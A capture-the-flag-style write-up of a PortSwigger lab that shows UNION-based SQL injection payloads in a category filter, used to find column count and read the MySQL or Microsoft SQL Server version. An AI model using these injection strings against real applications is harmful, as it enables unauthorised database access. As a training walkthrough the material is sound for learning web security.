# Write-up: SQL injection attack, querying the database type and version in MySQL and Microsoft
Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft>  
Difficulty: PRACTITIONER  
Python script: 

## Lab description

![alt text](<img/1.png>)

## Steps

### Enumeration

This lab is very similar to the previous lab, but this time we are looking for the database type and version on a MySQL and Microsoft database.

On googling we found out that the query `SELECT @@version` can be used to get the database version.

Now, we need to determine the number of columns returned by the query. We can hit and try to find the number of columns returned by the query. In MySQL, we use `#` to comment out the rest of the query.

So, the link is like `/filter?category=Gifts'+UNION+SELECT+@@version#`
and the query is like
```sql
' UNION SELECT @@version#
```
Above returns an error, which means the number of columns is not 1. Now we can try for 2 columns.

The link is like `/filter?category=Gifts'+UNION+SELECT+@@version,null#`
```sql
' UNION SELECT @@version, null#
```
This query returns the page without any error, which means the number of columns is 2 and we can now also see the database version at the bottom of the page.

### Solution

The link is like `/filter?category=Gifts'+UNION+SELECT+@@version,null#`
```sql
' UNION SELECT @@version, null#
```
This query returns the page without any error, which means the number of columns is 2 and we can now also see the database version at the bottom of the page.

![alt text](img/2.png)